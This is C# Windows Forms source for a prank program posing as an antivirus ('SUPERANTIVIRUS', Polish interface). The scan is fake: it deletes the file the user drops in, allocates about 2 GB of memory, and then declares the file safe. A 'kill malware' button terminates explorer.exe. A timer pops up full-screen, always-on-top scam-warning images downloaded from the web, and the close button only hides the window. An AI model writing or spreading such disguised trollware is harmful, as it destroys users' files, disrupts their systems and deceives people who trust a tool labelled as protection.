using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SUPERANTIVIRUS
{
    public partial class Form1 : Form
    {
        List<byte[]> memoryHog = new List<byte[]>();

        Label title;
        Panel dropZone;
        Label dropText;
        Button scanButton;
        Button infoButton;
        ProgressBar progress;

        string? currentFile = null;

        System.Windows.Forms.Timer scanTimer = new System.Windows.Forms.Timer();
        System.Windows.Forms.Timer trollTimer = new System.Windows.Forms.Timer();

        Random rand = new Random();

        public Form1()
        {
            this.Text = "superantivirus";
            this.Size = new Size(500, 300);
            this.StartPosition = FormStartPosition.CenterScreen;

            title = new Label();
            title.Text = "SUPERANTIVIRUS";
            title.Font = new Font("Arial", 18, FontStyle.Bold);
            title.AutoSize = true;
            title.Location = new Point(120, 20);

            dropZone = new Panel();
            dropZone.Size = new Size(300, 60);
            dropZone.Location = new Point(100, 70);
            dropZone.BorderStyle = BorderStyle.FixedSingle;
            dropZone.AllowDrop = true;

            dropText = new Label();
            dropText.Text = "Drag and drop file here";
            dropText.Dock = DockStyle.Fill;
            dropText.TextAlign = ContentAlignment.MiddleCenter;

            dropZone.Controls.Add(dropText);

            dropZone.DragEnter += DropZone_DragEnter;
            dropZone.DragDrop += DropZone_DragDrop;

            scanButton = new Button();
            scanButton.Text = "Skanuj plik";
            scanButton.Location = new Point(100, 140);
            scanButton.Enabled = false;
            scanButton.Click += ScanButton_Click;

            infoButton = new Button();
            infoButton.Text = "info";
            infoButton.Location = new Point(325, 140);
            infoButton.Click += InfoButton_Click;

            progress = new ProgressBar();
            progress.Size = new Size(300, 20);
            progress.Location = new Point(100, 180);

            this.Controls.Add(title);
            this.Controls.Add(dropZone);
            this.Controls.Add(scanButton);
            this.Controls.Add(infoButton);
            this.Controls.Add(progress);

            Button killButton = new Button();
            killButton.Text = "Zabij złosliwe oprogramowanie";
            killButton.Size = new Size(150, 50);
            killButton.Location = new Point(175, 205); 
            killButton.Click += KillButton_Click;

            this.Controls.Add(killButton);

            scanTimer.Interval = 100;
            scanTimer.Tick += ScanTimer_Tick;

            trollTimer.Interval = 120000;
            trollTimer.Tick += TrollTimer_Tick;
            trollTimer.Start();
        }

        private void DropZone_DragEnter(object? sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
        }

        void AllocateMemory()
        {
            try
            {
                for (int i = 0; i < 2; i++)
                {
                    memoryHog.Add(new byte[1024 * 1024 * 1024]);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }

        private void DropZone_DragDrop(object? sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

            if (files.Length > 0)
            {
                currentFile = files[0];
                dropText.Text = currentFile ?? "Drag and drop file here";
                scanButton.Enabled = true;
            }
        }

        private void ScanButton_Click(object? sender, EventArgs e)
        {
            progress.Value = 0;
            scanTimer.Start();
        }

        private void ScanTimer_Tick(object? sender, EventArgs e)
        {
            if (progress.Value < 100)
            {
                progress.Value = Math.Min(100, progress.Value + rand.Next(1, 10));
            }
            else
            {
                scanTimer.Stop();

                try
                {
                    if (!string.IsNullOrEmpty(currentFile) && File.Exists(currentFile))
                        File.Delete(currentFile);
                }
                catch { }

                AllocateMemory(); 

                MessageBox.Show("Plik jest w 100% bezpieczny ✅", "superantivirus");

                currentFile = null;
                dropText.Text = "Drag and drop file here";
                scanButton.Enabled = false;
            }
        }

        private void KillButton_Click(object? sender, EventArgs e)
        {
            try
            {
                var procesy = Process.GetProcessesByName("explorer");

                if (procesy.Length == 0)
                {
                    MessageBox.Show("Explorer is not running.");
                    return;
                }

                var result = MessageBox.Show(
                    $"Znaleziono {procesy.Length} złe oprogramowanie. Zamknąć?",
                    "Potwierdzenie",
                    MessageBoxButtons.YesNo
                );

                if (result == DialogResult.Yes)
                {
                    foreach (var p in procesy)
                    {
                        p.Kill(); // lmao
                    }

                    MessageBox.Show("Próba zamknięcia wirusa wykonana.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Błąd: " + ex.Message);
            }
        }

        private void InfoButton_Click(object? sender, EventArgs e)
        {
            MessageBox.Show("by chlebek07 v0.5", "info");
        }

        private async void TrollTimer_Tick(object? sender, EventArgs e)
        {
            await ShowImageAsync();
        }

        private async Task ShowImageAsync()
        {
            string[] urls = new string[]
            {
        "https://www.pcrisk.com/images/stories/screenshots202307/your-avast-antivirus-license-has-expired-pop-up-scam-main.jpg",
        "https://billauer.se/blog/wp-content/uploads/2022/06/install-update.jpg",
        "https://i.sstatic.net/pvJaO.png",
        "https://itsecurity.blog.fordham.edu/wp-content/uploads/2021/10/fakewarning-e1634668332242.png",
        "https://alphafoxforensics.com/wp-content/uploads/2025/09/Screenshot_20250829_121930_Samsung-Internet-980x653.jpg"
            };

            string url = urls[rand.Next(urls.Length)];

            try
            {
                using var http = new HttpClient();
                var data = await http.GetByteArrayAsync(url);
                using var ms = new MemoryStream(data);
                using var img = Image.FromStream(ms);
                Image displayImg = new Bitmap(img);

                Form imgForm = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true
                };

                PictureBox pb = new PictureBox
                {
                    Dock = DockStyle.Fill,
                    Image = displayImg,
                    SizeMode = PictureBoxSizeMode.StretchImage
                };

                imgForm.Controls.Add(pb);

                pb.Click += (s, e) =>
                {
                    try { pb.Image?.Dispose(); } catch { }
                    imgForm.Close();
                    imgForm.Dispose();
                };

                imgForm.Show();
            }
            catch
            {
                // zignorujmy to
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
            this.Hide();
        }
    }
}